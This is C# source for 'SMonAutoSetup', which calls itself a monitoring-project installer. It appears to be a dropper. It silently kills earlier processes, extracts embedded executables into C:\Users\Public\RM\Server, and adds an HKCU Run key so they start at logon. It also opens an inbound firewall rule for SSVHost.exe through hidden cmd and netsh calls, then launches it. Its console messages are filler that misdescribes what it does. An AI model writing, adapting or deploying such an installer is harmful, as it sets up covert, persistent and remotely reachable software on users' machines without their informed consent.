using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SMonAutoSetup
{
    class Program
    {
        private static void KillProcess(Process[] processes)
        {
            for (int i = 0; i < processes.Length; i++)
            {
                try
                {
                    processes[i].Kill();
                }
                catch
                {

                }
            }
        }
        private static Process[] FindProcess(string processName)
        {
            Process[] processList = Process.GetProcessesByName(processName);

            return processList;
        }

        private static void KillOldService()
        {
            try
            {
                var process = new System.Diagnostics.Process();
                var startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WorkingDirectory = @"C:\Windows\System32";
                startInfo.UseShellExecute = true;
                startInfo.CreateNoWindow = true;
                startInfo.FileName = "cmd.exe";
                string killservice = "/c sc stop SMonSvc";
                startInfo.Arguments = killservice;
                startInfo.Verb = "runas";
                process.StartInfo = startInfo;
                process.Start();
                process.WaitForExit();
            }
            catch
            {

            }
            Thread.Sleep(2000);
            try
            {
                var process = new System.Diagnostics.Process();
                var startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WorkingDirectory = @"C:\Windows\System32";
                startInfo.UseShellExecute = true;
                startInfo.CreateNoWindow = true;
                startInfo.FileName = "cmd.exe";
                string killservice = "/c sc delete SMonSvc";
                startInfo.Arguments = killservice;
                startInfo.Verb = "runas";
                process.StartInfo = startInfo;
                process.Start();
                process.WaitForExit();
            }
            catch
            {

            }
        }

        private static void KillNewService()
        {
            try
            {
                var process = new System.Diagnostics.Process();
                var startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WorkingDirectory = @"C:\Windows\System32";
                //startInfo.UseShellExecute = true;
                startInfo.CreateNoWindow = true;
                startInfo.FileName = "cmd.exe";
                string stopcmd = "/c taskkill /IM SSVHost.exe /F & taskkill /IM SSVAuto.exe /F";
                startInfo.Arguments = stopcmd;
                //startInfo.Verb = "runas";
                process.StartInfo = startInfo;
                process.Start();
                process.WaitForExit();
            }
            catch
            {

            }

            try
            {
                var process = new System.Diagnostics.Process();
                var startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WorkingDirectory = @"C:\Windows\System32";
                //startInfo.UseShellExecute = true;
                startInfo.CreateNoWindow = true;
                startInfo.FileName = "cmd.exe";
                string stopcmd = "/c taskkill /IM SSVHost.exe /F & taskkill /IM SSVAuto.exe /F";
                startInfo.Arguments = stopcmd;
                //startInfo.Verb = "runas";
                process.StartInfo = startInfo;
                process.Start();
                process.WaitForExit();
            }
            catch
            {

            }
            //try
            //{
            //    var processes = FindProcess("SSVHost.exe");
            //    KillProcess(processes);
            //    processes = FindProcess("SSVAuto.exe");
            //    KillProcess(processes);
            //}
            //catch
            //{

            //}


            try
            {
                var processes = FindProcess("SSVHostController");
                KillProcess(processes);
            }
            catch
            {

            }
        }

        static string strVersion = "1.7.8b";
        static void Main(string[] args)
        {
            Console.WriteLine("Creating Date : 03/10/2021");
            Console.WriteLine("Monitoring project version " + strVersion);
            Console.WriteLine("Copyright Ryonbong. All right reserved.");
            string oldpath = @"C:\Program Files (x86)\RM\Server\";
            //KillOldService();
            //Thread.Sleep(2000);
            //KillOldService();

            KillNewService();

            try
            {
                var processes = FindProcess("Monitor.TaskControl");
                KillProcess(processes);
            }
            catch
            {

            }
            Thread.Sleep(3000);
            Console.WriteLine("");
            Console.WriteLine("checking old files....");
            Console.WriteLine("It may take a while for checking to respond.");
            Console.WriteLine("Please know that I will get to your case as soon as possible.");
            Thread.Sleep(2000);
            // delete all old files
            //try
            //{
            //    try
            //    {
            //        if (File.Exists(Path.Combine(oldpath, "Monitor.TaskControl.exe")))
            //        {
            //            File.Delete(Path.Combine(oldpath, "Monitor.TaskControl.exe"));
            //        }
            //    }
            //    catch
            //    {

            //    }
            //    try
            //    {
            //        if (File.Exists(Path.Combine(oldpath, "SSVHostController.exe")))
            //        {
            //            File.Delete(Path.Combine(oldpath, "SSVHostController.exe"));
            //        }
            //    }
            //    catch (Exception ex)
            //    {
            //    }
            //    if (Directory.Exists(oldpath))
            //    {
            //        Directory.Delete(oldpath, true);
            //    }
            //}
            //catch (Exception ex)
            //{
            //}
            if (File.Exists("C:\\Users\\Public\\SMonAutoSetup.exe"))
            {
                try
                {
                    File.Delete("C:\\Users\\Public\\SMonAutoSetup.exe");
                }
                catch (Exception ex)
                {
                    //File.AppendAllText("log.txt", ex.Message);
                }
            }
            Console.WriteLine("");
            Console.WriteLine("suspending the process...");
            Console.WriteLine("This is small job so the processing will not be very much.");
            Thread.Sleep(2000);

            var hostname = "SSVHost.exe";
            var monitorname = "Monitor.TaskControl.exe";
            
            string path = "C:\\Users\\Public\\RM\\Server\\";
            
            
            //new file delete
            try
            {
                if (File.Exists(Path.Combine(path, hostname)))
                {
                    File.Delete(Path.Combine(path, hostname));
                }
            }
            catch (Exception ex)
            {
                // File.AppendAllText("log.txt", ex.Message);
            }
            try
            {
                if (File.Exists(Path.Combine(path, "SSVAuto.exe")))
                {
                    File.Delete(Path.Combine(path, "SSVAuto.exe"));
                }
            }
            catch (Exception ex)
            {
                // File.AppendAllText("log.txt", ex.Message);
            }
            try
            {
                if (File.Exists(Path.Combine(path, monitorname)))
                {
                    File.Delete(Path.Combine(path, monitorname));
                }
            }
            catch (Exception ex)
            {
            }

            try
            {
                if (Directory.Exists(path))
                {
                    Directory.Delete(path, true);
                }
            }
            catch (Exception ex)
            {
            }

            try
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey("Software", true);
                key = key.CreateSubKey("RMServer");
                key.SetValue("Version", strVersion);
                key.Close();
            }
            catch
            {

            }

            // File.AppendAllText("log.txt", "deleted old files");
            Console.WriteLine("");
            Console.WriteLine("installing new process...");
            Console.WriteLine("It look like our installing is coming to end now.");
            Console.WriteLine("Thank you for your Patience.");
            Thread.Sleep(2000);
            // check directory and create.
            if (!Directory.Exists(path))
            {
                try
                {
                    Directory.CreateDirectory(path);
                }
                catch (UnauthorizedAccessException ex)
                {
                    // File.AppendAllText("Error while creating directory", ex.Message);
                }
            }
            //copy files
            try
            {
                Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SMonAutoSetup.SSVHost.exe");
                FileStream fileStream = new FileStream(Path.Combine(path, "SSVHost.exe"), FileMode.CreateNew);
                for (int i = 0; i < stream.Length; i++)
                    fileStream.WriteByte((byte)stream.ReadByte());
                fileStream.Close();
            }
            catch (Exception ex)
            {
                // File.AppendAllText("log.txt", ex.Message);
            }
            try
            {
                Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SMonAutoSetup.SSVAuto.exe");
                FileStream fileStream = new FileStream(Path.Combine(path, "SSVAuto.exe"), FileMode.CreateNew);
                for (int i = 0; i < stream.Length; i++)
                    fileStream.WriteByte((byte)stream.ReadByte());
                fileStream.Close();
            }
            catch (Exception ex)
            {
                // File.AppendAllText("log.txt", ex.Message);
            }
            try
            {
                Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SMonAutoSetup.Monitor.TaskControl.exe");
                FileStream fileStream = new FileStream(Path.Combine(path, "Monitor.TaskControl.exe"), FileMode.CreateNew);
                for (int i = 0; i < stream.Length; i++)
                    fileStream.WriteByte((byte)stream.ReadByte());
                fileStream.Close();
            }
            catch (Exception ex)
            {
                // File.AppendAllText("log.txt", ex.Message);
            }

            try
            {
                Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SMonAutoSetup.LiveCharts.dll");
                FileStream fileStream = new FileStream(Path.Combine(path, "LiveCharts.dll"), FileMode.CreateNew);
                for (int i = 0; i < stream.Length; i++)
                    fileStream.WriteByte((byte)stream.ReadByte());
                fileStream.Close();
            }
            catch (Exception ex)
            {
                // File.AppendAllText("log.txt", ex.Message);
            }
            try
            {
                Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SMonAutoSetup.LiveCharts.Wpf.dll");
                FileStream fileStream = new FileStream(Path.Combine(path, "LiveCharts.Wpf.dll"), FileMode.CreateNew);
                for (int i = 0; i < stream.Length; i++)
                    fileStream.WriteByte((byte)stream.ReadByte());
                fileStream.Close();
            }
            catch (Exception ex)
            {
                // File.AppendAllText("log.txt", ex.Message);
            }

            // File.AppendAllText("log.txt", "Copied new files");
            //register for the start up running
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            rkApp.SetValue("SSVHost", "C:\\Users\\Public\\RM\\Server\\SSVHost.exe");
            //run command line
            try
            {
                var process = new System.Diagnostics.Process();
                var startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WorkingDirectory = @"C:\Windows\System32";
                startInfo.UseShellExecute = false;
                startInfo.CreateNoWindow = true;
                startInfo.FileName = "cmd.exe";
                string command = "/c netsh advfirewall firewall delete rule name=\"SSVHost\"";
                command += " & netsh advfirewall firewall delete rule name=\"MonitorControl\"";
                command += " & netsh advfirewall firewall add rule name=\"SSVHost\" dir=in action=allow program=\"C:\\Users\\Public\\RM\\Server\\SSVHost.exe\" enable=yes profile=public ";
                command += " & netsh advfirewall firewall add rule name=\"SSVHost\" dir=in action=allow program=\"C:\\Users\\Public\\RM\\Server\\SSVHost.exe\" enable=yes profile=public";
                startInfo.Arguments = command;
                startInfo.Verb = "runas";
                process.StartInfo = startInfo;
                process.Start();
                process.WaitForExit();
            }
            catch
            {

            }

            
            
            //delete service if it exists


            try
            {
                var proc = new Process();
                proc.StartInfo.FileName = "C:\\Users\\Public\\RM\\Server\\SSVHost.exe";
                proc.StartInfo.UseShellExecute = true;
                proc.Start();
            }
            catch
            {

            }
            Console.WriteLine("Successfully installed");
            Console.WriteLine("Press anykey to exit");
        }
    }
}
